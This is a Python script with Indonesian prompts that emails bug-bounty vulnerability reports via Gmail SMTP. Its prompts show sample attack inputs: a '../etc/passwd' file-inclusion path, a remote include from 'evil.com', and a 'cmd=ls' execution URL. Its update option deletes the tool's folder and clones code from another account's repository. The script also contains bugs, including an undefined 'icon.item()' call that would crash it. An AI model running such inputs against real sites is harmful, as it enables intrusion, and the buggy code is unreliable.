#!/usr/bin/python3

import smtplib
import os
from email.mime.base import MIMEBase
from email import encoders
from email.mime.application import MIMEApplication
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
from os import system
from getpass import getpass

'''
Skrip Kode Dibuat Oleh Yoga913

INSTAGRAM : https://www.instagram.com/ygarfynt._/
GITHUB    : https://github.com/Yoga913
bugcrownds : https://bugcrowd.com/YogaArfiyanto07
'''

class colors:
    def __init__(self, inputColor):
        self.Color = inputColor

red = colors('\033[91m')
green = colors('\033[92m')
yellow = colors('\033[93m')
cyan = colors('\033[96m')
WHITE = '\033[97m'
RED = '\033[91m'
RESET = '\033[0m'  # Reset warna ke default

system('clear')

print (f"""
{RED}██████╗ ██╗   ██╗ ██████╗
██╔══██╗██║   ██║██╔════╝
██████╔╝██║   ██║██║  ███╗    █████╗█████╗
██╔══██╗██║   ██║██║   ██║    ╚════╝╚════╝
██████╔╝╚██████╔╝╚██████╔╝
╚═════╝  ╚═════╝  ╚═════╝{RESET}
{WHITE}██████╗ ███████╗██████╗  ██████╗ ██████╗ ████████╗
██╔══██╗██╔════╝██╔══██╗██╔═══██╗██╔══██╗╚══██╔══╝
██████╔╝█████╗  ██████╔╝██║   ██║██████╔╝   ██║
██╔══██╗██╔══╝  ██╔═══╝ ██║   ██║██╔══██╗   ██║
██║  ██║███████╗██║     ╚██████╔╝██║  ██║   ██║
╚═╝  ╚═╝╚══════╝╚═╝      ╚═════╝ ╚═╝  ╚═╝   ╚═╝{RESET}
""")
print (red.Color+'###################################################################')
print ('## '+cyan.Color+'[●] Alat ini akan otomatis mengirimkan laporan bug melalui email!'+red.Color+' ##')
print ('## '+cyan.Color+'[●] Aktifkan (aplikasi yang kurang aman) di pengaturan email Anda agar berfungsi!'+red.Color+' ##')
print ('###################################################################')
print ('\n'+yellow.Color+'[●] Pilih jenis vulnerability yang ingin Anda laporkan!')
print ('═════════════════════════════════════════════════')
print ('    '+green.Color+'[1].'+yellow.Color+' SQLI[SQL Injection]')
print ('    '+green.Color+'[2].'+yellow.Color+' LFI[Local File Inclusion]')
print ('    '+green.Color+'[3].'+yellow.Color+' RFI[Remote File Inclusion]')
print ('    '+green.Color+'[4].'+yellow.Color+' RCE[Remote Code Execution]')
print ('    '+green.Color+'[5].'+yellow.Color+' CSRF Attack')
print ('    '+green.Color+'[6].'+yellow.Color+' XSS[Cross Site Scripting]')
print ('    '+green.Color+'[7].'+yellow.Color+' SSI[Server Side Injection]')
print ('    '+green.Color+'[8].'+yellow.Color+' CSV Injection')
print ('    '+green.Color+'[9].'+yellow.Color+' Parameter Tampering')
print ('   '+green.Color+'[10].'+yellow.Color+' Bypass Admin')
print ('   '+green.Color+'[99].'+yellow.Color+' Keluar/Keluar')
print ('   '+green.Color+'[00].'+yellow.Color+' Instal Ulang/Perbarui Alat\n')

print ('\n'+green.Color+'╭━━¤'+yellow.Color+' [ Masukkan nomor yang dipilih]')
inputbug = input(green.Color+'╰━━¤ √ : ')

msg = MIMEMultipart()

if inputbug == '1':
    inputsite = '<b>URL vulnerability SQL Injection :</b> '
    print ('\n'+cyan.Color+'[●] Contoh: https://pornsite.com/view.php?id=12')
    print (yellow.Color+'═════════════════════════════════════════════')
    print (green.Color+'╭━━¤'+yellow.Color+' [Masukkan URL situs web bug]')
    urlsite = input(green.Color+'╰━━¤  √  : ')
    if urlsite:
        print ('')
    else:
        print ('\n'+red.Color+'[!] Silakan masukkan nama situs !')
        print (yellow.Color+'══════════════════════════════════════\n')
        exit()
    closemail = '<br><br> Dengan laporan ini semoga laporan bug saya dapat diterima dengan baik, terima kasih.'
    respect = '<br><br>Hormat saya, <br>'
    print (green.Color+'╭━━¤'+yellow.Color+' [ Masukkan Nama Anda ]')
    yourname = input(green.Color+'╰━━¤  √  : ')
    if yourname:
        print('')
    else:
        print ('\n'+red.Color+'[!]  Silakan masukkan nama Anda !')
        print (yellow.Color+'════════════════════════════\n')
        exit()
    tableclose = '''</p></td></tr><tr>
    <th class="thtwo">
    Dilaporkan menggunakan alat laporan bug<br>alat yang dibuat oleh <a href="https://github.com/Yoga913">yoga913</a>
    </th>
    </tr></table></td></tr></table></body></html>
    '''

    msg.attach(MIMEText(open('templates/sqli.html',).read(),'html'))
    msg.attach(MIMEText(inputsite,'html'))
    msg.attach(MIMEText(urlsite,'html'))
    msg.attach(MIMEText(closemail,'html'))
    msg.attach(MIMEText(respect,'html'))
    msg.attach(MIMEText(yourname,'html'))
    msg.attach(MIMEText(tableclose,'html'))
    print (cyan.Color+'[●] Masukkan file Anda sebagai POC (Proof of Concept)!')
    print ('[●] Contoh: /storage/emulated/0/Document/bugreport.pdf')
    print ('[●] Contoh: /storage/emulated/0/Pictures/bugreport.jpg')
    print ('[●] Contoh: /storage/emulated/0/Recorder/bugreport.mp4')
    print (yellow.Color+'════════════════════════════════════════════════════')
    print (green.Color+'╭━━¤'+yellow.Color+' [Masukkan berkas dokumen Anda (default:Example.jpg)]')
    file_location = input(green.Color+'╰━━¤ √  : ') or 'Example.jpg'
    filename = os.path.basename(file_location)
    attachment = open(file_location, "rb")
    part = MIMEBase('application', 'octet-stream')
    part.set_payload(attachment.read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', "attachment; filename= %s" % filename)
    msg.attach(part)




elif inputbug == '2':
    inputsite = '<b>URL vulnerability Local File Inclusion :</b> '
    print ('\n'+cyan.Color+'[●] Contoh: https://pornsite.com/view/?file=../etc/passwd')
    print (yellow.Color+'═══════════════════════════════════════════════════════')
    print (green.Color+'╭━━¤'+yellow.Color+' [ Masukkan URL situs bug ]')
    urlsite = input(green.Color+'╰━━¤ √  : ')
    if urlsite:
        print ('')
    else:
        print ('\n'+red.Color+'[!] Silakan masukkan nama situs!')
        print (yellow.Color+'═══════════════════════════\n')
        exit()
    closemail = '<br><br>Dengan laporan ini semoga laporan bug saya dapat diterima dengan baik, terima kasih.'
    respect = '<br><br>Hormat saya,<br>'
    print (green.Color+'╭━━¤'+yellow.Color+' [Masukkan Nama Anda]')
    yourname = input(green.Color+'╰━━¤ √  : ')
    if yourname:
        print('')
    else:
        print ('\n'+red.Color+'[!] Silakan masukkan nama Anda!')
        print (yellow.Color+'═══════════════════════════\n')
        exit()
    tableclose = '''</p></td></tr><tr>
    <th class="thtwo">
    Dilaporkan menggunakan alat laporan bug<br>alat yang dibuat oleh <a href="https://github.com/Yoga913">Yoga913</a>
    </th>
    </tr></table></td></tr></table></body></html>
    '''
    msg.attach(MIMEText(open('templates/lfi.html',).read(),'html'))
    msg.attach(MIMEText(inputsite,'html'))
    msg.attach(MIMEText(urlsite,'html'))
    msg.attach(MIMEText(closemail,'html'))
    msg.attach(MIMEText(respect,'html'))
    msg.attach(MIMEText(yourname,'html'))
    msg.attach(MIMEText(tableclose,'html'))
    print (cyan.Color+'[●] Masukkan file Anda sebagai POC (Proof of Concept)!')
    print ('[●] Contoh: /storage/emulated/0/Document/bugreport.pdf')
    print ('[●] Contoh: /storage/emulated/0/Pictures/bugreport.jpg')
    print ('[●] Contoh: /storage/emulated/0/Recorder/bugreport.mp4')
    print (yellow.Color+'════════════════════════════════════════════════════')
    print (green.Color+'╭━━¤'+yellow.Color+' [Masukkan berkas dokumen Anda (default:Example.jpg)]')
    file_location = input(green.Color+'╰━━¤ √  : ') or 'Example.jpg'
    filename = os.path.basename(file_location)
    attachment = open(file_location, "rb")
    part = MIMEBase('application', 'octet-stream')
    part.set_payload(attachment.read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', "attachment; filename= %s" % filename)
    msg.attach(part)



elif inputbug == '3':
    inputsite = '<b>URL vulnerability Remote File Inclusion :</b> '
    print ('\n'+cyan.Color+'[●] Contoh: https://pornsite.com/view/?page=http://evil.com/maliciousfile.txt')
    print (yellow.Color+'══════════════════════════════════════════════════')
    print (green.Color+'╭━━¤'+yellow.Color+' [Masukkan URL situs bug]')
    urlsite = input(green.Color+'╰━━¤ √  : ')
    if urlsite:
        print ('')
    else:
        print ('\n'+red.Color+'[!] Silakan masukkan nama situs!')
        print (yellow.Color+'═══════════════════════════\n')
        exit()
    closemail = '<br><br>Dengan laporan ini semoga laporan bug saya dapat diterima dengan baik, terima kasih.'
    respect = '<br><br>Hormat saya,<br>'
    print (green.Color+'╭━━¤'+yellow.Color+' [Masukkan Nama Anda]')
    yourname = input(green.Color+'╰━━¤ √  : ')
    if yourname:
        print('')
    else:
        print ('\n'+red.Color+'[!] Silakan masukkan nama Anda!')
        print (yellow.Color+'═══════════════════════════\n')
        exit()
    tableclose = '''</p></td></tr><tr>
    <th class="thtwo">
    Dilaporkan menggunakan alat laporan bug<br>alat yang dibuat oleh <a href="https://github.com/Yoga913">Yoga913</a>
    </th>
    </tr></table></td></tr></table></body></html>
    '''
    msg.attach(MIMEText(open('templates/rfi.html',).read(),'html'))
    msg.attach(MIMEText(inputsite,'html'))
    msg.attach(MIMEText(urlsite,'html'))
    msg.attach(MIMEText(closemail,'html'))
    msg.attach(MIMEText(respect,'html'))
    msg.attach(MIMEText(yourname,'html'))
    msg.attach(MIMEText(tableclose,'html'))
    print (cyan.Color+'[●] Masukkan file Anda sebagai POC (Proof of Concept)!')
    print ('[●] Contoh: /storage/emulated/0/Document/bugreport.pdf')
    print ('[●] Contoh: /storage/emulated/0/Pictures/bugreport.jpg')
    print ('[●] Contoh: /storage/emulated/0/Recorder/bugreport.mp4')
    print (yellow.Color+'═══════════════════════════════════════════════════')
    print (green.Color+'╭━━¤'+yellow.Color+' [Masukkan berkas dokumen Anda (default:Example.jpg)]')
    file_location = input(green.Color+'╰━━¤ √  : ') or 'Example.jpg'
    filename = os.path.basename(file_location)
    attachment = open(file_location, "rb")
    part = MIMEBase('application', 'octet-stream')
    part.set_payload(attachment.read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', "attachment; filename= %s" % filename)
    msg.attach(part)



elif inputbug == '4':
    inputsite = '<b>URL vulnerability Remote Code Execution :</b> '
    print ('\n'+cyan.Color+'[●] Contoh: https://pornsite.com/exec.php?cmd=ls')
    print (yellow.Color+'════════════════════════════════════════════════════')
    print (green.Color+'╭━━¤'+yellow.Color+' [Masukkan URL situs bug]')
    urlsite = input(green.Color+'╰━━¤ √  : ')
    if urlsite:
        print ('')
    else:
        print ('\n'+red.Color+'[!] Silakan masukkan nama situs!')
        print (yellow.Color+'═══════════════════════════\n')
        exit()
    closemail = '<br><br>Dengan laporan ini semoga laporan bug saya dapat diterima dengan baik, terima kasih.'
    respect = '<br><br>Hormat saya,<br>'
    print (green.Color+'╭━━¤'+yellow.Color+' [Masukkan Nama Anda]')
    yourname = input(green.Color+'╰━━¤ √  : ')
    if yourname:
        print('')
    else:
        print ('\n'+red.Color+'[!] Silakan masukkan nama Anda!')
        print (yellow.Color+'═══════════════════════════\n')
        exit()
    tableclose = '''</p></td></tr><tr>
    <th class="thtwo">
    Dilaporkan menggunakan alat laporan bug<br>alat yang dibuat oleh <a href="https://github.com/Yoga913">Yoga913</a>
    </th>
    </tr></table></td></tr></table></body></html>
    '''
    msg.attach(MIMEText(open('templates/rce.html',).read(),'html'))
    msg.attach(MIMEText(inputsite,'html'))
    msg.attach(MIMEText(urlsite,'html'))
    msg.attach(MIMEText(closemail,'html'))
    msg.attach(MIMEText(respect,'html'))
    msg.attach(MIMEText(yourname,'html'))
    msg.attach(MIMEText(tableclose,'html'))
    print (cyan.Color+'[●] Masukkan file Anda sebagai POC (Proof of Concept)!')
    print ('[●] Contoh: /storage/emulated/0/Document/bugreport.pdf')
    print ('[●] Contoh: /storage/emulated/0/Pictures/bugreport.jpg')
    print ('[●] Contoh: /storage/emulated/0/Recorder/bugreport.mp4')
    print (yellow.Color+'═══════════════════════════════════════════════════')
    print (green.Color+'╭━━¤'+yellow.Color+' [Masukkan berkas dokumen Anda (default:Example.jpg)]')
    file_location = input(green.Color+'╰━━¤ √  : ') or 'Example.jpg'
    filename = os.path.basename(file_location)
    attachment = open(file_location, "rb")
    part = MIMEBase('application', 'octet-stream')
    part.set_payload(attachment.read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', "attachment; filename= %s" % filename)
    msg.attach(part)



elif inputbug == '5':
    inputsite = '<b>URL vulnerability CSRF Attack :</b> '
    print ('\n'+cyan.Color+'[●] Contoh: https://pornsite.com/change-password?csrf=1234567890')
    print (yellow.Color+'══════════════════════════════════════════════════════')
    print (green.Color+'╭━━¤'+yellow.Color+' [Masukkan URL situs bug]')
    urlsite = input(green.Color+'╰━━¤ √  : ')
    if urlsite:
        print ('')
    else:
        print ('\n'+red.Color+'[!] Silakan masukkan nama situs!')
        print (yellow.Color+'═══════════════════════════\n')
        exit()
    closemail = '<br><br>Dengan laporan ini semoga laporan bug saya dapat diterima dengan baik, terima kasih.'
    respect = '<br><br>Hormat saya,<br>'
    print (green.Color+'╭━━¤'+yellow.Color+' [Masukkan Nama Anda]')
    yourname = input(green.Color+'╰━━¤ √  : ')
    if yourname:
        print('')
    else:
        print ('\n'+red.Color+'[!] Silakan masukkan nama Anda!')
        print (yellow.Color+'═══════════════════════════\n')
        exit()
    tableclose = '''</p></td></tr><tr>
    <th class="thtwo">
    Dilaporkan menggunakan alat laporan bug<br>alat yang dibuat oleh <a href="https://github.com/Yoga913">Yoga913</a>
    </th>
    </tr></table></td></tr></table></body></html>
    '''
    msg.attach(MIMEText(open('templates/csrf.html',).read(),'html'))
    msg.attach(MIMEText(inputsite,'html'))
    msg.attach(MIMEText(urlsite,'html'))
    msg.attach(MIMEText(closemail,'html'))
    msg.attach(MIMEText(respect,'html'))
    msg.attach(MIMEText(yourname,'html'))
    msg.attach(MIMEText(tableclose,'html'))
    print (cyan.Color+'[●] Masukkan file Anda sebagai POC (Proof of Concept)!')
    print ('[●] Contoh: /storage/emulated/0/Document/bugreport.pdf')
    print ('[●] Contoh: /storage/emulated/0/Pictures/bugreport.jpg')
    print ('[●] Contoh: /storage/emulated/0/Recorder/bugreport.mp4')
    print (yellow.Color+'═══════════════════════════════════════════════════')
    print (green.Color+'╭━━¤'+yellow.Color+' [Masukkan berkas dokumen Anda (default:Example.jpg)]')
    file_location = input(green.Color+'╰━━¤ √  : ') or 'Example.jpg'
    filename = os.path.basename(file_location)
    attachment = open(file_location, "rb")
    part = MIMEBase('application', 'octet-stream')
    part.set_payload(attachment.read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', "attachment; filename= %s" % filename)
    msg.attach(part)



elif inputbug == '6':
    inputsite = '<b>URL vulnerability serangan XSS :</b> '
    print ('\n'+cyan.Color+'[●] Contoh: https://pornsite.com/search/?q=')
    print (yellow.Color+'════════════════════════════════════════')
    print (green.Color+'╭━━¤'+yellow.Color+' [Masukkan URL situs bug]')
    urlsite = input(green.Color+'╰━━¤ √  : ')
    if urlsite:
        print ('')
    else:
        print ('\n'+red.Color+'[!] Silahkan masukan nama situs!')
        print (yellow.Color+'═══════════════════════════\n')
        exit()
    closemail = '<br><br>Dengan laporan ini semoga bug report saya dapat diterima dengan baik, terima kasih.'
    respect = '<br><br>Hormat saya, <br>'
    print (green.Color+'╭━━¤'+yellow.Color+' [Masukkan nama Anda]')
    yourname = input(green.Color+'╰━━¤ √  : ')
    if yourname:
        print('')
    else:
        print ('\n'+red.Color+'[!] Silakan masukkan nama Anda!')
        print (yellow.Color+'═══════════════════════════\n')
        exit()
    tableclose = '''</p></td></tr><tr>
    <th class="thtwo">
    Dilaporkan menggunakan alat laporan bug<br>Alat yang dibuat oleh <a href="https://github.com/Yoga913">Yoga913</a>
    </th>
    </tr></table></td></tr></table></body></html>
    '''

    msg.attach(MIMEText(open('templates/xss.html',).read(),'html'))
    msg.attach(MIMEText(inputsite,'html'))
    msg.attach(MIMEText(urlsite,'html'))
    msg.attach(MIMEText(closemail,'html'))
    msg.attach(MIMEText(respect,'html'))
    msg.attach(MIMEText(yourname,'html'))
    msg.attach(MIMEText(tableclose,'html'))
    print (cyan.Color+'[●] Masukkan file Anda sebagai POC (Proof of Concept)!')
    print ('[●] Contoh: /storage/emulated/0/Document/bugreport.pdf')
    print ('[●] Contoh: /storage/emulated/0/Pictures/bugreport.jpg')
    print ('[●] Contoh: /storage/emulated/0/Recorder/bugreport.mp4')
    print (yellow.Color+'═══════════════════════════════════════════════════')
    print (green.Color+'╭━━¤'+yellow.Color+' [Masukkan file dokumen Anda (default:Example.jpg)]')
    file_location = input(green.Color+'╰━━¤ √  : ') or 'Example.jpg'# ========================
    filename = os.path.basename(file_location)
    attachment = open(file_location, "rb")
    part = MIMEBase('application', 'octet-stream')
    part.set_payload(attachment.read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', "attachment; filename= %s" % filename)
    msg.attach(part)



elif inputbug == '7':
    inputsite = '<b>URL vulnerability Server Side Injection :</b> '
    print ('\n'+cyan.Color+'[●] Contoh: https://pornsite.com/member/login.shtml?page=')
    print (yellow.Color+'══════════════════════════════════════════════════════')
    print (green.Color+'╭━━¤'+yellow.Color+' [Masukkan URL situs bug]')
    urlsite = input(green.Color+'╰━━¤ √  : ')
    if urlsite:
        print ('')
    else:
        print ('\n'+red.Color+'[!] Silahkan masukan nama situs!')
        print (yellow.Color+'═══════════════════════════\n')
        exit()
    closemail = '<br><br>Dengan laporan ini semoga bug report saya dapat diterima dengan baik, terima kasih.'
    respect = '<br><br>Hormat saya, <br>'
    print (green.Color+'╭━━¤'+yellow.Color+' [Masukkan nama Anda]')
    yourname = input(green.Color+'╰━━¤ √  : ')
    if yourname:
        print('')
    else:
        print ('\n'+red.Color+'[!] Silakan masukkan nama Anda!')
        print (yellow.Color+'═══════════════════════════\n')
        exit()
    tableclose = '''</p></td></tr><tr>
    <th class="thtwo">
    Dilaporkan menggunakan alat laporan bug<br>Alat yang dibuat oleh <a href="https://github.com/Yoga913">Yoga913</a>
    </th>
    </tr></table></td></tr></table></body></html>
    '''
    msg.attach(MIMEText(open('templates/ssi.html',).read(),'html'))
    msg.attach(MIMEText(inputsite,'html'))
    msg.attach(MIMEText(urlsite,'html'))
    msg.attach(MIMEText(closemail,'html'))
    msg.attach(MIMEText(respect,'html'))
    msg.attach(MIMEText(yourname,'html'))
    msg.attach(MIMEText(tableclose,'html'))
    print (cyan.Color+'[●] Masukkan file Anda sebagai POC (Proof of Concept)!')
    print ('[●] Contoh: /storage/emulated/0/Document/bugreport.pdf')
    print ('[●] Contoh: /storage/emulated/0/Pictures/bugreport.jpg')
    print ('[●] Contoh: /storage/emulated/0/Recorder/bugreport.mp4')
    print (yellow.Color+'═══════════════════════════════════════════════════')
    print (green.Color+'╭━━¤'+yellow.Color+' [Masukkan file dokumen Anda (default:Example.jpg)]')
    file_location = input(green.Color+'╰━━¤ √  : ') or 'Example.jpg'
    filename = os.path.basename(file_location)
    attachment = open(file_location, "rb")
    part = MIMEBase('application', 'octet-stream')
    part.set_payload(attachment.read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', "attachment; filename= %s" % filename)
    msg.attach(part)



elif inputbug == '8':
    inputsite = '<b>URL vulnerability CSV Injection :</b> '
    print ('\n'+cyan.Color+'[●] Contoh: https://pornsite.com/member/upload_video/#addvideo')
    print (yellow.Color+'═══════════════════════════════════════════════════════════')
    print (green.Color+'╭━━¤'+yellow.Color+'[Masukkan URL situs bug]')
    urlsite = input(green.Color+'╰━━¤ √  : ')
    if urlsite:
        print ('')
    else:
        print ('\n'+red.Color+'[!] Silahkan masukan nama situs!')
        print (yellow.Color+'═══════════════════════════\n')
        exit()
    closemail = '<br><br>Dengan laporan ini semoga bug report saya dapat diterima dengan baik, terima kasih.'
    respect = '<br><br>Hormat saya, <br>'
    print (green.Color+'╭━━¤'+yellow.Color+' [Masukkan nama Anda]')
    yourname = input(green.Color+'╰━━¤ √  : ')
    if yourname:
        print('')
    else:
        print ('\n'+red.Color+'[!] Silakan masukkan nama Anda!')
        print (yellow.Color+'═══════════════════════════\n')
        exit()
    tableclose = '''</p></td></tr><tr>
    <th class="thtwo">
    Dilaporkan menggunakan alat laporan bug<br>Alat yang dibuat oleh <a href="https://github.com/Yoga913">yoga913</a>
    </th>
    </tr></table></td></tr></table></body></html>
    '''
    msg.attach(MIMEText(open('templates/csv.html',).read(),'html'))
    msg.attach(MIMEText(inputsite,'html'))
    msg.attach(MIMEText(urlsite,'html'))
    msg.attach(MIMEText(closemail,'html'))
    msg.attach(MIMEText(respect,'html'))
    msg.attach(MIMEText(yourname,'html'))
    msg.attach(MIMEText(tableclose,'html'))
    print (cyan.Color+'[●] Masukkan file Anda sebagai POC (Proof of Concept)!')
    print ('[●] Contoh: /storage/emulated/0/Document/bugreport.pdf')
    print ('[●] Contoh: /storage/emulated/0/Pictures/bugreport.jpg')
    print ('[●] Contoh: /storage/emulated/0/Recorder/bugreport.mp4')
    print (yellow.Color+'═══════════════════════════════════════════════════')
    print (green.Color+'╭━━¤'+yellow.Color+' [Masukkan file dokumen Anda (default:Example.jpg)]')
    file_location = input(green.Color+'╰━━¤ √  : ') or 'Example.jpg'
    filename = os.path.basename(file_location)
    attachment = open(file_location, "rb")
    part = MIMEBase('application', 'octet-stream')
    part.set_payload(attachment.read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', "attachment; filename= %s" % filename)
    msg.attach(part)



elif inputbug == '9':
    inputsite = '<b>URL vulnerability Parameter Tempering :</b> '
    print ('\n'+cyan.Color+'[●] Contoh: https://pornsite.com/download/?vid=asian.mp4&price=1000')
    print (yellow.Color+'════════════════════════════════════════════════════════════════')
    print (green.Color+'╭━━¤'+yellow.Color+' [Masukkan URL situs bug]')
    urlsite = input(green.Color+'╰━━¤ √  : ')
    if urlsite:
        print ('')
    else:
        print ('\n'+red.Color+'[!] Silahkan masukan nama situs!')
        print (yellow.Color+'═══════════════════════════\n')
        exit()
    closemail = '<br><br>Dengan laporan ini semoga bug report saya dapat diterima dengan baik, terima kasih.'
    respect = '<br><br>Hormat saya,<br>'
    print (green.Color+'╭━━¤'+yellow.Color+' [Masukkan nama Anda]')
    yourname = input(green.Color+'╰━━¤ √  : ')
    if yourname:
        print('')
    else:
        print ('\n'+red.Color+'[!] Silakan masukkan nama Anda!')
        print (yellow.Color+'═══════════════════════════\n')
        exit()
    tableclose = '''</p></td></tr><tr>
    <th class="thtwo">
    Dilaporkan menggunakan alat laporan bug<br>Alat yang dibuat oleh <a href="https://github.com/Yoga913">Yoga913</a>
    </th>
    </tr></table></td></tr></table></body></html>
    '''
    msg.attach(MIMEText(open('templates/paramtemper.html',).read(),'html'))
    msg.attach(MIMEText(inputsite,'html'))
    msg.attach(MIMEText(urlsite,'html'))
    msg.attach(MIMEText(closemail,'html'))
    msg.attach(MIMEText(respect,'html'))
    msg.attach(MIMEText(yourname,'html'))
    msg.attach(MIMEText(tableclose,'html'))
    print (cyan.Color+'[●] Masukkan file Anda sebagai POC (Proof of Concept)!')
    print ('[●] Contoh: /storage/emulated/0/Document/bugreport.pdf')
    print ('[●] Contoh: /storage/emulated/0/Pictures/bugreport.jpg')
    print ('[●] Contoh: /storage/emulated/0/Recorder/bugreport.mp4')
    print (yellow.Color+'═══════════════════════════════════════════════════')
    print (green.Color+'╭━━¤'+yellow.Color+' [Masukkan file dokumen Anda (default:Example.jpg)]')
    file_location = input(green.Color+'╰━━¤ √  : ') or 'Example.jpg'
    filename = os.path.basename(file_location)
    attachment = open(file_location, "rb")
    part = MIMEBase('application', 'octet-stream')
    part.set_payload(attachment.read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', "attachment; filename= %s" % filename)
    msg.attach(part)



elif inputbug == '10':
    inputsite = '<b>URL vulnerability Bypass Admin :</b> '
    print ('\n'+cyan.Color+'[●] Contoh: https://pornsite.com/adminporn/login.php')
    print (yellow.Color+'═════════════════════════════════════════════════')
    print (green.Color+'╭━━¤'+yellow.Color+' [Masukkan URL situs bug]')
    urlsite = input(green.Color+'╰━━¤ √  : ')
    if urlsite:
        print ('')
    else:
        print ('\n'+red.Color+'[!] Silahkan masukan nama situs!')
        print (yellow.Color+'═══════════════════════════\n')
        exit()
    closemail = '<br><br>Dengan laporan ini semoga bug report saya dapat diterima dengan baik, terima kasih.'
    respect = '<br><br>Hormat saya, <br>'
    print (green.Color+'╭━━¤'+yellow.Color+' [Masukkan nama Anda]')
    yourname = input(green.Color+'╰━━¤ √  : ')
    if yourname:
        print('')
    else:
        print ('\n'+red.Color+'[!] Silakan masukkan nama Anda!')
        print (yellow.Color+'═══════════════════════════\n')
        exit()
    tableclose = '''</p></td></tr><tr>
    <th class="thtwo">
    Dilaporkan menggunakan alat laporan bug<br>Alat yang dibuat oleh <a href="https://github.com/Yoga913">Yoga913</a>
    </th>
    </tr></table></td></tr></table></body></html>
    '''
    msg.attach(MIMEText(open('templates/rfi.html',).read(),'html'))
    msg.attach(MIMEText(inputsite,'html'))
    msg.attach(MIMEText(urlsite,'html'))
    msg.attach(MIMEText(closemail,'html'))
    msg.attach(MIMEText(respect,'html'))
    msg.attach(MIMEText(yourname,'html'))
    msg.attach(MIMEText(tableclose,'html'))
    print (cyan.Color+'[●] Masukkan file Anda sebagai POC (Proof of Concept)!')
    print ('[●] Contoh: /storage/emulated/0/Document/bugreport.pdf')
    print ('[●] Contoh: /storage/emulated/0/Pictures/bugreport.jpg')
    print ('[●] Contoh: /storage/emulated/0/Recorder/bugreport.mp4')
    print (yellow.Color+'═══════════════════════════════════════════════════')
    print (green.Color+'╭━━¤'+yellow.Color+' [Masukkan file dokumen Anda (default:Example.jpg)]')
    file_location = input(green.Color+'╰━━¤ √  : ') or 'Example.jpg'
    filename = os.path.basename(file_location)
    attachment = open(file_location, "rb")
    part = MIMEBase('application', 'octet-stream')
    part.set_payload(attachment.read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', "attachment; filename= %s" % filename)
    msg.attach(part)

elif inputbug == '99':
    print ('\n'+cyan.Color+'[●] Selamat hari yang menyenangkan!')
    print (yellow.Color+'════════════════════')
    exit()

elif inputbug == '00':
    sys = system('cd .. && rm -rf bugreport && git clone https://github.com/marioyhzkiell/bugreport.git')
    print ('\n'+cyan.Color+'[●] Berhasil Reinstall/Update Alat!')
    print ('[●] CTRL + D untuk keluar, dan login lagi!')
    print (yellow.Color+'═══════════════════════════════════════')
    exit()
else:
    print ('\n'+red.Color+ '[!] Input salah !')
    print (yellow.Color+ '═════════════════')
    exit()

system('clear')
icon.item()
print (cyan.Color+'[●] Masukan akun email yang digunakan!')
print (yellow.Color+'═════════════════════════════════════════')
print ('    '+green.Color+'[1].'+yellow.Color+' Gmail')
print ('   '+green.Color+'[99].'+yellow.Color+' Keluar/Putus')
print ('\n'+green.Color+'╭━━¤'+yellow.Color+' [Masukkan nomor yang dipilih]')
choice = input(green.Color+'╰━━¤ √  : ')
if choice == '1':
        server = smtplib.SMTP('smtp.gmail.com', 587)
elif choice == '99':
        print ('\n'+cyan.Color+'[●] Selamat hari yang menyenangkan!')
        print (yellow.Color+'════════════════════')
        exit()
else:
        print ('\n'+red.Color+'[!] Input salah!')
        print (yellow.Color+'════════════════')
        exit()

print ('\n'+green.Color+'╭━━¤'+yellow.Color+' [Masukkan email Anda]')
email = input(green.Color+'╰━━¤ √  : ')
if email:
    print ('')
else:
    print ('\n'+red.Color+'[!] Silakan masukkan email Anda!')
    print (yellow.Color+'════════════════════════════\n')
    exit()

print (cyan.Color+'[●] Kosongkan password ATAU Lihat password untuk memasukkan password Anda?')
print (yellow.Color+'══════════════════════════════════════════════════════')
print ('    '+green.Color+'[1].'+yellow.Color+' Lihat Password')
print ('    '+green.Color+'[2].'+yellow.Color+' Kosongkan Password')
print ('\n'+green.Color+'╭━━¤'+yellow.Color+' [Masukkan nomor yang dipilih]')
inputpass = input(green.Color+'╰━━¤ √  : ')
if inputpass == '1':
    print ('\n'+green.Color+'╭━━¤'+yellow.Color+' [Masukkan password email Anda]')
    password = input(green.Color+'╰━━¤ √  : ')
    if password:
        print ('')
    else:
        print ('\n'+red.Color+'[!] Silakan masukkan password Anda!')
        print (yellow.Color+'═══════════════════════════════\n')
        exit()
else:
    print ('\n'+red.Color+'[!] Input salah!')
    print (yellow.Color+'════════════════')
    exit()

print (green.Color+'╭━━¤'+yellow.Color+' [Masukkan alamat email tujuan]')
toaddr = input(green.Color+'╰━━¤ √  : ')
if toaddr:
    print ('')
else:
    print ('\n'+red.Color+'[!] Silakan masukkan alamat email tujuan!')
    print (yellow.Color+'════════════════════════════════════════\n')
    exit()

print (cyan.Color+'[●] Masukkan judul email Anda!')
print ('[●] Contoh: [BUG BOUNTY TOKOPEDIA] Stored XSS untuk mendapatkan info pengguna')
print ('[●] Contoh: [xx.xx.go.id] SQL INJECTION di /berita.php?id=12')
print ('[●] Contoh: [pornsite.com] SQL INJECTION di /index.php?id=12')
print (yellow.Color+'═════════════════════════════════════════════════════════')
print (green.Color+'╭━━¤'+yellow.Color+' [Masukkan judul email Anda]')
title = input(green.Color+'╰━━¤ √  : ')
if title:
    print ('')
else:
    print ('\n'+red.Color+'[!] Silakan masukkan judul email Anda!')
    print (yellow.Color+'══════════════════════════════════\n')
    exit()

msg['From'] = email
msg['To'] = toaddr
msg['Subject'] = title
server.starttls()
text = msg.as_string()
server.login(email, password)
server.sendmail(email, toaddr, text)
print ('\n'+cyan.Color+'[●] Berhasil dikirim! Periksa pesan terkirim di email Anda!')
server.quit()
